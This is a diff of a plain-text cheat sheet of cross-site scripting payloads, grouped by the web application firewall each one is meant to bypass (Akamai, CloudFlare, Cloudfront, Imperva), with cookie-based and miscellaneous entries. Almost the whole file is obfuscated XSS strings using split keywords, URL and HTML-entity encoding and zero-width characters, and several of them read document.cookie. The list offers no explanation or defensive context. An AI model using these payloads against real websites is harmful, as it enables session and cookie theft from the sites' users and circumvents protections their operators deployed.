@@ -1,9 +1,11 @@
-1. Akamai WAf 
+Akamai WAf 
+
 ';k='e'%0Atop['al'+k+'rt'](1)//
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
   
-2. CloudFlare WAf 
+CloudFlare
+
 <svg/onload=window["al"+"ert"]1337>  
 <Img Src=OnXSS OnError=confirm(1337)>  
 <Svg Only=1 OnLoad=confirm(document.domain)>  
@@ -16,16 +18,23 @@
 "><Svg Only=1 OnLoad​=confirm(atob("Q2xvdWRmbGFyZSBYU1Mg"))>
 ["');alert('XSS');//"]
   
-3. Cloudfront Waf
+Cloudfront
+
 ">'><details/open/ontoggle=confirm('XSS')>  
 6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/  
 ';window/*aabb*/['al'%2b'ert'] document./*aabb*/location);//  
 ">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
 
-4. Cookie
+Imperva
+
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
+
+Cookies
+
 logged_out_uuid=<​script>alert('Cookie based Xss by Muhammad Qasim')<​/script>
 
-5. Otros
+Otros
+
 "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
 1%22onfocus=%27alert%28document.cookie%29%27%20autofocus=
 1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
